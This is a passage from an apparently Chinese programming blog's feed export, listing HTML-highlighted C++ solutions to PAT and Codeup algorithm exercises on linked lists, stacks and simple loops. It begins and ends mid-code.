class="string">&quot;%d%d%d&quot;</span>,&amp;address,&amp;key,&amp;next);</span><br><span class="line">        node[address].address=address;</span><br><span class="line">        node[address].next=next;</span><br><span class="line">        node[address].key=key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> p=head;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="number">-1</span>)&#123;</span><br><span class="line">        node[p].flag=<span class="literal">true</span>;</span><br><span class="line">        count++;</span><br><span class="line">        p=node[p].next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(count==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;0 -1&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        sort(node,node+<span class="number">100001</span>,cmp);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %05d\n&quot;</span>,count,node[<span class="number">0</span>].address);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;count;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i!=count<span class="number">-1</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%05d %d %05d\n&quot;</span>,node[i].address,node[i].key,node[i+<span class="number">1</span>].address);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%05d %d -1\n&quot;</span>,node[i].address,node[i].key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1032</span></span><br><span class="line"><span class="comment">struct node</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    char data;</span></span><br><span class="line"><span class="comment">    int next;</span></span><br><span class="line"><span class="comment">    bool flag=false;</span></span><br><span class="line"><span class="comment">&#125;node[100001];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int address1,address2,n;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d%d%d&quot;,&amp;address1,&amp;address2,&amp;n);</span></span><br><span class="line"><span class="comment">    int address,next;</span></span><br><span class="line"><span class="comment">    char data;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d %c %d&quot;,&amp;address,&amp;data,&amp;next);</span></span><br><span class="line"><span class="comment">        node[address].data=data;</span></span><br><span class="line"><span class="comment">        node[address].next=next;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    int p;</span></span><br><span class="line"><span class="comment">    for(p=address1;p!=-1;p=node[p].next) node[p].flag=true;</span></span><br><span class="line"><span class="comment">    for(p=address2;p!=-1;p=node[p].next) if(node[p].flag==true) break;</span></span><br><span class="line"><span class="comment">    if(p!=-1) printf(&quot;%05d&quot;,p);</span></span><br><span class="line"><span class="comment">    else printf(&quot;-1&quot;);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="7-上机"><a href="#7-上机" class="headerlink" title="7(上机)"></a>7(上机)</h2><h3 id="7-1"><a href="#7-1" class="headerlink" title="7.1"></a>7.1</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1051</span></span><br><span class="line"><span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; now;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m,n,k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;m,&amp;n,&amp;k);</span><br><span class="line">    <span class="keyword">while</span>(k--)&#123;</span><br><span class="line">        <span class="keyword">while</span>(!now.empty()) now.pop();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">        <span class="keyword">bool</span> flag=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">int</span> out=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            now.push(i);</span><br><span class="line">            <span class="keyword">if</span>(now.size()&gt;m)&#123;</span><br><span class="line">                flag=<span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(!now.empty()&amp;&amp;now.top()==a[out])&#123;</span><br><span class="line">                now.pop();</span><br><span class="line">                out++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(now.empty()==<span class="literal">true</span>&amp;&amp;flag==<span class="literal">true</span>) <span class="built_in">printf</span>(<span class="string">&quot;YES\n&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;NO\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="7-2"><a href="#7-2" class="headerlink" title="7.2"></a>7.2</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1051</span></span><br><span class="line"><span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; now;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m,n,k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;m,&amp;n,&amp;k);</span><br><span class="line">    <span class="keyword">while</span>(k--)&#123;</span><br><span class="line">        <span class="keyword">while</span>(!now.empty()) now.pop();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">        <span class="keyword">bool</span> flag=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">int</span> out=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            now.push(i);</span><br><span class="line">            <span class="keyword">if</span>(now.size()&gt;m)&#123;</span><br><span class="line">                flag=<span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(!now.empty()&amp;&amp;now.top()==a[out])&#123;</span><br><span class="line">                now.pop();</span><br><span class="line">                out++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(now.empty()==<span class="literal">true</span>&amp;&amp;flag==<span class="literal">true</span>) <span class="built_in">printf</span>(<span class="string">&quot;YES\n&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;NO\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="7-3-1"><a href="#7-3-1" class="headerlink" title="7.3"></a>7.3</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT B1025</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> address,next,data;</span><br><span class="line">    <span class="keyword">int</span> order=<span class="number">100002</span>;</span><br><span class="line">&#125;node[<span class="number">100001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(Node a,Node b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.order&lt;b.order;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> head,n,k;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;head,&amp;n,&amp;k);</span><br><span class="line">    <span class="keyword">while</span>(n--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;node[temp].data,&amp;node[temp].next);</span><br><span class="line">        node[temp].address=temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> p=head;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="number">-1</span>)&#123;</span><br><span class="line">        node[p].order=++count;</span><br><span class="line">        p=node[p].next;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(node,node+<span class="number">100001</span>,cmp);</span><br><span class="line">    n=count;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n/k;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=(i+<span class="number">1</span>)*k<span class="number">-1</span>;j&gt;i*k;j--)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%05d %d %05d\n&quot;</span>,node[j].address,node[j].data,node[j<span class="number">-1</span>].address);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%05d %d &quot;</span>,node[i*k].address,node[i*k].data);</span><br><span class="line">        <span class="keyword">if</span>(i&lt;n/k<span class="number">-1</span>) <span class="built_in">printf</span>(<span class="string">&quot;%05d\n&quot;</span>,node[(i+<span class="number">2</span>)*k<span class="number">-1</span>].address);</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(n%k==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%05d\n&quot;</span>,node[(i+<span class="number">1</span>)*k].address);</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=n/k*k;i&lt;n;i++)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%05d %d &quot;</span>,node[i].address,node[i].data);</span><br><span class="line">                    <span class="keyword">if</span>(i&lt;n<span class="number">-1</span>) <span class="built_in">printf</span>(<span class="string">&quot;%05d\n&quot;</span>,node[i+<span class="number">1</span>].address);</span><br><span class="line">                    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1097</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX=<span class="number">100001</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> key,address,next;</span><br><span class="line">    <span class="keyword">int</span> order=<span class="number">2</span>*MAX;</span><br><span class="line">&#125;node[MAX];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(Node a,Node b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.order&lt;b.order;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> HashTable[<span class="number">2</span>*MAX]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> head,n;</span><br><span class="line">    <span class="keyword">int</span> address,key,next;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;head,&amp;n);</span><br><span class="line">    <span class="keyword">while</span>(n--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>,&amp;address,&amp;key,&amp;next);</span><br><span class="line">        node[address].address=address;</span><br><span class="line">        node[address].next=next;</span><br><span class="line">        node[address].key=key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> remove=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> p=head;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!HashTable[<span class="built_in">abs</span>(node[p].key)])&#123;</span><br><span class="line">            HashTable[<span class="built_in">abs</span>(node[p].key)]=<span class="literal">true</span>;</span><br><span class="line">            node[p].order=++count;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            node[p].order=MAX+remove++;</span><br><span class="line">        &#125;</span><br><span class="line">        p=node[p].next;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(node,node+MAX,cmp);</span><br><span class="line">    n=count+remove;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i!=count<span class="number">-1</span>&amp;&amp;i!=n<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%05d %d %05d\n&quot;</span>,node[i].address,node[i].key,node[i+<span class="number">1</span>].address);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%05d %d -1\n&quot;</span>,node[i].address,node[i].key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>算法笔记_第三章</title>
    <url>/2020/01/12/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%89%E7%AB%A0/</url>
    <content><![CDATA[<p>第三章书上的题目+Codeup+上机训练</p>
<span id="more"></span>

<h2 id="3-书"><a href="#3-书" class="headerlink" title="3(书)"></a>3(书)</h2><h3 id="3-1"><a href="#3-1" class="headerlink" title="3.1"></a>3.1</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT B1032</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> total_score[<span class="number">100000</span>];</span><br><span class="line">    <span class="built_in">memset</span>(total_score,<span class="number">0</span>,<span class="keyword">sizeof</span>(total_score));  <span class="comment">//数组每个元素赋零</span></span><br><span class="line">    <span class="keyword">int</span> n=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);  <span class="comment">//n行</span></span><br><span class="line">    <span class="keyword">int</span> school_ID,school_SCORE;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;school_ID,&amp;school_SCORE);</span><br><span class="line">        total_score[school_ID<span class="number">-1</span>]+=school_SCORE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> max_id=<span class="number">0</span>,max_score=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(total_score[i]&gt;max_score)&#123;</span><br><span class="line">            max_score=total_score[i];</span><br><span class="line">            max_id=i+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,max_id,max_score);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">PAT B1001</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int n,step=0;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;n);  //n&lt;=1000</span></span><br><span class="line"><span class="comment">    while(n!=1)&#123;</span></span><br><span class="line"><span class="comment">        if(n%2==0)&#123;</span></span><br><span class="line"><span class="comment">            n/=2;</span></span><br><span class="line"><span class="comment">            step++;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else&#123;</span></span><br><span class="line"><span class="comment">            n*=3;</span></span><br><span class="line"><span class="comment">            n+=1;</span></span><br><span class="line"><span class="comment">            n/=2;</span></span><br><span class="line"><span class="comment">            step++;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;%d&quot;,step);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-3"><a href="#3-3" class="headerlink" title="3.3"></a>3.3</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT B1036</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> col=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> row=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %c&quot;</span>,&amp;col,&amp;c);</span><br><span class="line">    <span class="keyword">if</span>(col%<span class="number">2</span>==<span class="number">0</span>) row=col/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">else</span> row=col/<span class="number">2</span>+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;col;i++) <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;row;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,c);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;col<span class="number">-2</span>;j++) <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>,c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;col;i++) <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-4"><a href="#3-4" class="headerlink" title="3.4"></a>3.4</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Codeup 1928</span></span><br><span class="line"><span class="comment">//A</span></span><br><span class="line"><span class="comment">//以下答案会超时，不过只想研究一下基本做法，没做深究</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">runNian</span><span class="params">(<span class="keyword">int</span> year)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (year%<span class="number">4</span>==<span class="number">0</span>&amp;&amp;year%<span class="number">100</span>!=<span class="number">0</span>) || (year%<span class="number">400</span>==<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> day[<span 